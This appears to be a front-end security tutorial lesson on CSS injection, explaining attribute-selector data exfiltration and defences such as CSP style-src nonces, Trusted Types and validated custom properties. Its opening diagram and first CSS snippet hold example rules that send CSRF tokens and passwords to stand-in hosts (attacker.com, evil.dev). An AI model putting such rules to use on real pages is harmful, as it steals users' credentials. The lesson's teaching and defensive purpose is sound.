---
title: 'CSS Security, CSS Injection Attacks & CSP style-src'
description: 'Master CSS security vulnerabilities: CSS Injection data exfiltration attacks, Content Security Policy (CSP style-src) nonces, Trusted Types for CSS, and securing third-party stylesheets.'
order: 41
difficulty: 'advanced'
category: 'Level 3 — Advanced'
estimatedMinutes: 30
prerequisites:
  - /learn/css/40-accessibility
---

# CSS Security, CSS Injection Attacks & CSP style-src

While most security discussions focus on JavaScript and backend SQL injection, **CSS is also a potent attack vector**. Malicious actors can exploit unescaped user-supplied styles to execute **CSS Data Exfiltration Attacks** (stealing passwords, CSRF tokens, and credit card numbers character by character using CSS attribute selectors and background network pings), perform Clickjacking overlays, or track user browsing behavior without JavaScript.

In this lesson, we explore how CSS Injection attacks operate, how to lock down stylesheets with **Content Security Policy (`style-src`)**, **W3C Trusted Types for CSS**, and safe dynamic styling guidelines.

```text
┌────────────────────────────────────────────────────────────┐
│              How a CSS Data Exfiltration Attack Works      │
├────────────────────────────────────────────────────────────┤
│ Attacker injects malicious CSS rules into the page:        │
│                                                            │
│ input[name="csrf"][value^="a"] {                           │
│   background-image: url('https://attacker.com/leak?c=a');  │
│ }                                                          │
│ input[name="csrf"][value^="b"] {                           │
│   background-image: url('https://attacker.com/leak?c=b');  │
│ }                                                          │
│                                                            │
│ When the browser matches the value, it makes an HTTP       │
│ background request, leaking the secret token to attacker!  │
└────────────────────────────────────────────────────────────┘
```

## 1. The Mechanics of CSS Data Exfiltration

If an application allows untrusted user input to be injected directly into a `<style>` tag or inline `style` attribute, an attacker can brute-force sensitive values character by character:

```css
/* Malicious CSS snippet stealing a password or auth token */
input[type="password"][value^="p"] { background-image: url("https://evil.dev/log?val=p"); }
input[type="password"][value^="pa"] { background-image: url("https://evil.dev/log?val=pa"); }
input[type="password"][value^="pas"] { background-image: url("https://evil.dev/log?val=pas"); }
input[type="password"][value^="pass"] { background-image: url("https://evil.dev/log?val=pass"); }
```

As the browser renders the matching selector, it triggers an HTTP GET request to the attacker's endpoint, transmitting the user's password keystroke by keystroke!

## 2. Defending Against Style Injection with CSP `style-src`

Deploy a strict **Content Security Policy (CSP)** that bans unauthorized external stylesheets and disallows raw inline styles without cryptographic nonces:

```http
Content-Security-Policy: default-src 'self'; \
  style-src 'self' 'nonce-rAnd0m123' https://fonts.googleapis.com; \
  img-src 'self' data:; \
  connect-src 'self' https://api.front-heaven.dev;
```

### Key CSP Directives for CSS:
- **`'unsafe-inline'`**: **Never use in production** unless strictly necessary, as it permits attackers to inject malicious `<style>` tags.
- **Nonces (`'nonce-rAnd0m123'`)**: Generates a unique cryptographic token per HTTP response; only `<style nonce="rAnd0m123">` tags matching the header token are allowed to execute.
- **`img-src` & `connect-src`**: Restricting image and network connection domains prevents background CSS `url()` requests from transmitting exfiltrated data to attacker servers.

## 3. Trusted Types for CSS (`createHTML`, `createScriptURL`)

W3C Trusted Types can be extended to enforce sanitization policies on dynamic CSS manipulations:

```typescript
// Prevent raw strings from being assigned to style tags
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  const cssPolicy = window.trustedTypes.createPolicy("css-sanitizer", {
    createHTML: (dirtyCSS: string) => sanitizeCSSRules(dirtyCSS),
  });
}
```

## 4. Safe Dynamic Styling in Front-End Frameworks

When accepting dynamic styling values from user input (e.g., custom dashboard theme color pickers), **never concatenate raw user strings into CSS stylesheets or HTML `style` attributes**.

Instead, validate the input against a strict Hex/OKLCH regex and set it via CSS Custom Properties:

```typescript
// ✅ Secure Dynamic Styling in JavaScript
function applyUserBrandColor(userInputColor: string) {
  // 1. Strict regex validation (Hex or OKLCH format only!)
  const HEX_REGEX = /^#([0-9a-f]{3}|[0-9a-f]{6})$/i;
  if (!HEX_REGEX.test(userInputColor)) {
    throw new Error("Invalid color format");
  }

  // 2. Safely apply through CSS Custom Property
  document.documentElement.style.setProperty("--user-custom-color", userInputColor);
}
```

## Summary

- CSS injection attacks can exfiltrate sensitive passwords and tokens via attribute selector background pings.
- Strict CSP `style-src` with cryptographic nonces blocks injected inline `<style>` tags.
- Restricting `img-src` and `connect-src` prevents exfiltrated background network requests.
- Never concatenate raw unvalidated user input into `<style>` tags or `element.style`.
- Set validated dynamic user theme values exclusively through CSS Custom Properties (`setProperty`).

## Best Practices

1. **Deploy CSP Nonces on All Stylesheets**: Eliminate `'unsafe-inline'` in production environments.
2. **Strictly Validate User Theme Inputs with Regex**: Only allow valid hex, rgb, or oklch formats.
3. **Audit Third-Party CSS Packages**: Ensure third-party component libraries do not include tracking pings.
4. **Never Render Password or Token Values into HTML Value Attributes**: Keep sensitive strings in memory.
